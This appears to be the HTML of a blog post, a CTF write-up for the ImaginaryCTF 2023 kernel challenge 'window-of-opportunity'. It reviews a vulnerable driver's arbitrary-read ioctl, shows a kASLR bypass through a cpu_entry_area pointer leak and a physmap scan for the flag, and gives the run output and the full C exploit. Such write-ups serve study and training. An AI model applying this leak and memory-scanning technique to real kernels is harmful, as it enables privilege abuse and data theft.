@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="true" > 
+<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
+<link href="/fontawesome/css/brands.css" rel="stylesheet">
+<link href="/fontawesome/css/solid.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>[ImaginaryCTF 2023 - pwn] window-of-opportunity | repr</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="window-of-opportunity window-of-opportunity (490 pts) - 11 solvesby Eth007 Description: Sometimes, there is a glimmer of hope, a spark of inspiration, a window of opportunity. Attachmentshttps:&#x2F;&#x2F;imagi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[ImaginaryCTF 2023 - pwn] window-of-opportunity">
+<meta property="og:url" content="https://n4sm.github.io/posts/iwindow/index.html">
+<meta property="og:site_name" content="repr">
+<meta property="og:description" content="window-of-opportunity window-of-opportunity (490 pts) - 11 solvesby Eth007 Description: Sometimes, there is a glimmer of hope, a spark of inspiration, a window of opportunity. Attachmentshttps:&#x2F;&#x2F;imagi">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://media.tenor.com/16jBhCDB9x8AAAAC/kyudo-japanese.gif">
+<meta property="article:published_time" content="2023-07-23T22:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-01T11:36:29.506Z">
+<meta property="article:author" content="nasm">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="nasm">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="ImaginaryCTF">
+<meta property="article:tag" content="2023">
+<meta property="article:tag" content="kernel">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://media.tenor.com/16jBhCDB9x8AAAAC/kyudo-japanese.gif">
+  
+    <link rel="alternate" href="/atom.xml" title="repr" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  
+  
+    
+<div id="banner" class="">
+  <img src="/pic/wall.png" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="shadow   ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>repr </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/archives">Archives</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
+      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <span class="material-symbols-rounded rss">rss_feed</span>
+      </a>
+    
+    <a id="nav-search-btn" class="nav-icon" title="Search" style="display: none;">
+      <span class="material-symbols-rounded">search</span>
+    </a>
+    <div id="nav-menu-btn" class="nav-icon">
+      <span class="material-symbols-rounded">menu</span>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/archives">Archives</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=https://cdn.discordapp.com/attachments/755522926819934349/1135933820852502589/chtholly_nota_seniorious_by_asukaln_dfhx63b-414w-2x.jpg></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">nasm </div>
+      <div class="dot"></div>
+      <div class="subtitle">pwn / kernel stuff </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com/nasm_re" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/n4sm" title="GitHub"><i class="fa-brands fa-github"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://ret2school.github.io/discord" title="Discord"><i class="fa-brands fa-discord"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+  <div class="sticky">
+    
+      
+
+
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Categories</h3>
+      <div class="category-box">
+            <a class="category-link" href="/categories/pwn/">
+                pwn
+                <div class="category-count">19</div>
+            </a>
+        
+            <a class="category-link" href="/categories/kernel/">
+                kernel
+                <div class="category-count">3</div>
+            </a>
+        </div>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Recent Posts</h3>
+      <ul>
+        
+          <a class="recent-link" href="/posts/iwindow/" title="[ImaginaryCTF 2023 - pwn] window-of-opportunity" >
+            <div class="recent-link-text">
+              [ImaginaryCTF 2023 - pwn] window-of-opportunity
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/posts/mailman/" title="[ImaginaryCTF 2023 - pwn] mailman" >
+            <div class="recent-link-text">
+              [ImaginaryCTF 2023 - pwn] mailman
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+<article id="post-iwindow" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        [ImaginaryCTF 2023 - pwn] window-of-opportunity
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2023-07-23T22:00:00.000Z" itemprop="datePublished">2023-07-24</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+  <a class="meta-cate-link" href="/categories/kernel/">kernel</a>
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            1k words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2023/" rel="tag">2023</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ImaginaryCTF/" rel="tag">ImaginaryCTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nasm/" rel="tag">nasm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <h1 id="window-of-opportunity"><a href="#window-of-opportunity" class="headerlink" title="window-of-opportunity"></a>window-of-opportunity</h1><blockquote>
+<p>window-of-opportunity (490 pts) - 11 solves<br>by Eth007</p>
+<p>Description: Sometimes, there is a glimmer of hope, a spark of inspiration, a window of opportunity.</p>
+<p>Attachments<br><a target="_blank" rel="noopener" href="https://imaginaryctf.org/r/izYM0#opportunity_dist.zip">https://imaginaryctf.org/r/izYM0#opportunity_dist.zip</a> </p>
+<p>nc window-of-opportunity.chal.imaginaryctf.org 1337</p>
+</blockquote>
+<p><code>window-of-opportunity</code> is a kernel exploitation challenge I did for the <a target="_blank" rel="noopener" href="https://2023.imaginaryctf.org/">ImaginaryCTF 2023</a>. We are given an arbitrary read primitive (and a stack buffer overflow but I didn’t use it), and the goal is basically to read the <code>/flag.txt</code> file. All the related files can be found <a target="_blank" rel="noopener" href="https://github.com/ret2school/ctf/tree/master/2023/imaginaryctf/pwn/window">there</a>.</p>
+<p><img src="https://media.tenor.com/16jBhCDB9x8AAAAC/kyudo-japanese.gif" alt="&gt;...&lt;"></p>
+<p><strong>TLDR</strong>:</p>
+<ul>
+<li>Leaking with the help of the arbitrary read primitive the kernel base address by reading a pointer toward the .text stored within the fix-mapped <code>cpu_entry_area</code> mapping.</li>
+<li>Using the read primitive to read the whole physmap to get the flag (given the initramfs is mapped directly in the physmap).</li>
+<li>PROFIT</li>
+</ul>
+<h2 id="Code-review"><a href="#Code-review" class="headerlink" title="Code review"></a>Code review</h2><p>We are given a classic <code>initramfs</code> setup for this kernel challenge, which means we already know the whole <code>initramfs</code> will be mapped directly within the physmap mapping off the kernel. If you are not familiar yet with the physmap I advice you to read <a target="_blank" rel="noopener" href="https://blog.wohin.me/posts/linux-kernel-pwn-05/">this article</a>. Basically physmap is just a direct mapping of the whole physical memory and it is mapped at a known location from the kernel base address. And given the filesystem – in our case the <code>initramfs</code> – is directly mapped into the physical memory we can access it from the physmap.</p>
+<p>Let’s take at the <code>ioctl</code> provided by the kernel driver we have to pwn:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* !! This is not the actual decompiled code, I rewrote it to make it easier to read */</span></span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">device_ioctl</span><span class="params">(file *filp, __int64 cmd, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  request req; <span class="comment">// [rsp+0h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, cmd, arg);</span><br><span class="line">  v9 = v3;</span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)cmd == <span class="number">0x1337</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(&amp;req, arg, <span class="number">0x108</span>LL);</span><br><span class="line">    result = (<span class="type">int</span>)copy_to_user(arg.buf, req.ptr, <span class="number">0x100</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v8 != __readgsqword(<span class="number">0x28</span>u) )</span><br><span class="line">    JUMPOUT(<span class="number">0xC3</span>LL);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The structure used to exchange with the kernel driver looks like this:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">request_s</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> kptr;</span><br><span class="line">    <span class="type">uint8_t</span> buf[<span class="number">256</span>];</span><br><span class="line">&#125; <span class="type">request_t</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Which means we have a very powerful arbitrary read primitive.</p>
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>To compile the exploit and pack the fs I used this quick and dirty command  if you mind:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">musl-gcc src/exploit.c -static -o initramfs/exploit &amp;&amp; cd initramfs &amp;&amp; find . -print0 | cpio --null -ov --format=newc &gt; ../initramfs.cpio &amp;&amp; cd .. &amp;&amp; ./run.sh initramfs.cpio</span><br></pre></td></tr></table></figure>
+
+<p>First let’s take a look at the protection layout by using the <code>kchecksec</code> developped by <a target="_blank" rel="noopener" href="https://github.com/bata24">@bata24</a> in his awesome <a target="_blank" rel="noopener" href="https://github.com/bata24/gef">fork of gef</a>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; kchecksec</span><br><span class="line">------------------------------------------------------------------ Kernel information ------------------------------------------------------------------</span><br><span class="line">Kernel version                          : 5.19.0</span><br><span class="line">Kernel cmdline                          : console=ttyS0 oops=panic panic=1 kpti=1 kaslr quiet</span><br><span class="line">Kernel base (heuristic)                 : 0xffffffff9b600000</span><br><span class="line">Kernel base (_stext from kallsyms)      : 0xffffffff9b600000</span><br><span class="line">------------------------------------------------------------------- Register settings -------------------------------------------------------------------</span><br><span class="line">Write Protection (CR0 bit 16)           : Enabled</span><br><span class="line">PAE (CR4 bit 5)                         : Enabled (NX is supported)</span><br><span class="line">SMEP (CR4 bit 20)                       : Enabled</span><br><span class="line">SMAP (CR4 bit 21)                       : Enabled</span><br><span class="line">CET (CR4 bit 23)                        : Disabled</span><br><span class="line">-------------------------------------------------------------------- Memory settings --------------------------------------------------------------------</span><br><span class="line">CONFIG_RANDOMIZE_BASE (KASLR)           : Enabled</span><br><span class="line">CONFIG_FG_KASLR (FGKASLR)               : Unsupported</span><br><span class="line">CONFIG_PAGE_TABLE_ISOLATION (KPTI)      : Enabled</span><br><span class="line">RWX kernel page                         : Not found</span><br><span class="line">----------------------------------------------------------------------- Allocator -----------------------------------------------------------------------</span><br><span class="line">Allocator                               : SLUB</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED           : Enabled (offsetof(kmem_cache, random): 0xb8)</span><br><span class="line">-------------------------------------------------------------------- Security Module --------------------------------------------------------------------</span><br><span class="line">SELinux                                 : Disabled (selinux_init: Found, selinux_state: Not initialized)</span><br><span class="line">SMACK                                   : Disabled (smack_init: Found, smackfs: Not mounted)</span><br><span class="line">AppArmor                                : Enabled (apparmor_init: Found, apparmor_initialized: 1, apparmor_enabled: 1)</span><br><span class="line">TOMOYO                                  : Disabled (tomoyo_init: Found, tomoyo_enabled: 0)</span><br><span class="line">Yama (ptrace_scope)                     : Enabled (yama_init: Found, kernel.yama.ptrace_scope: 1)</span><br><span class="line">Integrity                               : Supported (integrity_iintcache_init: Found)</span><br><span class="line">LoadPin                                 : Unsupported (loadpin_init: Not found)</span><br><span class="line">SafeSetID                               : Supported (safesetid_security_init: Found)</span><br><span class="line">Lockdown                                : Supported (lockdown_lsm_init: Found)</span><br><span class="line">BPF                                     : Supported (bpf_lsm_init: Found)</span><br><span class="line">Landlock                                : Supported (landlock_init: Found)</span><br><span class="line">Linux Kernel Runtime Guard (LKRG)       : Disabled (Not loaded)</span><br><span class="line">----------------------------------------------------------------- Dangerous system call -----------------------------------------------------------------</span><br><span class="line">vm.unprivileged_userfaultfd             : Disabled (vm.unprivileged_userfaultfd: 0)</span><br><span class="line">kernel.unprivileged_bpf_disabled        : Enabled (kernel.unprivileged_bpf_disabled: 2)</span><br><span class="line">kernel.kexec_load_disabled              : Disabled (kernel.kexec_load_disabled: 0)</span><br><span class="line">------------------------------------------------------------------------- Other -------------------------------------------------------------------------</span><br><span class="line">CONFIG_KALLSYMS_ALL                     : Enabled</span><br><span class="line">CONFIG_RANDSTRUCT                       : Disabled</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER            : Disabled (modprobe_path: RW-)</span><br><span class="line">CONFIG_STACKPROTECTOR                   : Enabled (offsetof(task_struct, stack_canary): 0x9c8)</span><br><span class="line">KADR (kallsyms)                         : Enabled (kernel.kptr_restrict: 2, kernel.perf_event_paranoid: 2)</span><br><span class="line">KADR (dmesg)                            : Enabled (kernel.dmesg_restrict: 1)</span><br><span class="line">vm.mmap_min_addr                        : 0x10000</span><br></pre></td></tr></table></figure>
+
+<p>What matters for us is mainly the KASLR that is on. Then, the first step will be to defeat it.</p>
+<h2 id="Defeat-kASLR"><a href="#Defeat-kASLR" class="headerlink" title="Defeat kASLR"></a>Defeat kASLR</h2><p>To defeat kASLR we could use the trick already use a while ago by the hxp team in one of their <a target="_blank" rel="noopener" href="https://hxp.io/blog/99/hxp-CTF-2022-one_byte-writeup/">kernel shellcoding challenge</a>. The idea would be to read through the <code>cpu_entry_area</code> fix-mapped area, that is not rebased by the kASLR, a pointer toward the kernel .text. Then giving us a powerful infoleak thats allows us to find for example the address of the physmap. I just had to search a few minutes the right pointer in gdb and that’s it, at <code>0xfffffe0000002f50</code> is stored a pointer toward <code>KERNEL_BASE + 0x1000b59</code>! Which gives:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">req.kptr = <span class="number">0xfffffe0000002f50</span>; </span><br><span class="line"><span class="keyword">if</span> (ioctl(fd, <span class="number">0x1337</span>, &amp;req)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kernel_text =  ((<span class="type">uint64_t</span>* )req.buf)[<span class="number">0</span>] - <span class="number">0x1000b59</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] kernel .text found at %lx\n&quot;</span>, kernel_text);</span><br></pre></td></tr></table></figure>
+
+<h2 id="physmap-for-the-win"><a href="#physmap-for-the-win" class="headerlink" title="physmap for the win"></a>physmap for the win</h2><p>Now we know where the kernel .text is we can deduce by it the addres of the physmap and then we can simply look for the <code>icft</code> pattern while reading the whole physmap. Which gives:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] physmap at %lx\n&quot;</span>, kernel_text + <span class="number">0x2c3b000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    req.kptr = kernel_text + <span class="number">0x2c00000</span> + offt;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(fd, <span class="number">0x1337</span>, &amp;req)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">memcmp</span>(req.buf+i, <span class="string">&quot;ictf&quot;</span>, <span class="number">4</span>)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;flag: %s\n&quot;</span>, (<span class="type">char</span>* )(req.buf+i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    offt += <span class="number">0x100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="PROFIT"><a href="#PROFIT" class="headerlink" title="PROFIT"></a>PROFIT</h2><p>Finally here we are:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mount: mounting host0 on /tmp/mount failed: No such device</span><br><span class="line">cp: can&#x27;t stat &#x27;/dev/sda&#x27;: No such file or directory</span><br><span class="line"></span><br><span class="line">Boot time: 2.78</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">                     _                            </span><br><span class="line">                    | |                           </span><br><span class="line">       __      _____| | ___ ___  _ __ ___   ___   </span><br><span class="line">       \ \ /\ / / _ \ |/ __/ _ \| &#x27;_ ` _ \ / _ \  </span><br><span class="line">        \ V  V /  __/ | (_| (_) | | | | | |  __/_ </span><br><span class="line">         \_/\_/ \___|_|\___\___/|_| |_| |_|\___(_)</span><br><span class="line">                                            </span><br><span class="line">  Take the opportunity. Look through the window. Get the flag.</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">/ # ./exploit </span><br><span class="line">[!] kernel .text found at ffffffff8de00000</span><br><span class="line">[!] physmap at ffffffff90a3b000</span><br><span class="line">flag: ictf&#123;th3_real_flag_was_the_f4ke_st4ck_canaries_we_met_al0ng_the_way&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Annexes"><a href="#Annexes" class="headerlink" title="Annexes"></a>Annexes</h1><p>Final exploit:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">request_s</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> kptr;</span><br><span class="line">    <span class="type">uint8_t</span> buf[<span class="number">256</span>];</span><br><span class="line">&#125; <span class="type">request_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint64_t</span> kernel_text = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint64_t</span> offt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/window&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req.kptr = <span class="number">0xfffffe0000002f50</span>; </span><br><span class="line">    <span class="keyword">if</span> (ioctl(fd, <span class="number">0x1337</span>, &amp;req)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_text =  ((<span class="type">uint64_t</span>* )req.buf)[<span class="number">0</span>] - <span class="number">0x1000b59</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] kernel .text found at %lx\n&quot;</span>, kernel_text);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] physmap at %lx\n&quot;</span>, kernel_text + <span class="number">0x2c3b000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        req.kptr = kernel_text + <span class="number">0x2c00000</span> + offt;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(fd, <span class="number">0x1337</span>, &amp;req)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">memcmp</span>(req.buf+i, <span class="string">&quot;ictf&quot;</span>, <span class="number">4</span>)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;flag: %s\n&quot;</span>, (<span class="type">char</span>* )(req.buf+i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        offt += <span class="number">0x100</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left  disabled "
